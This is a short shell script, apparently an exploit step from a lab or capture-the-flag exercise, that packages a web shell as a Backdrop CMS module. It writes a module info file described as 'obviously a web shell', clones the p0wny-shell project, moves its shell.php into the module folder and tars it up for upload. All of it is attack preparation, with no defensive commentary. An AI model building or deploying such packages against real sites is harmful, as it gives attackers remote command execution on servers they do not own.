mkdir shell
cat > shell/shell.info <<EOF 
type = module
name = Web Shell
description = This is obviously a web shell
backdrop = 1.x

; Added by Backdrop CMS packaging script on 2025-05-18
project = web_shell
version = 1.x-1.0.0
timestamp = 174763417
EOF
git clone https://github.com/flozz/p0wny-shell
mv p0wny-shell/shell.php shell/shell.php
tar -cf shell.tar shell

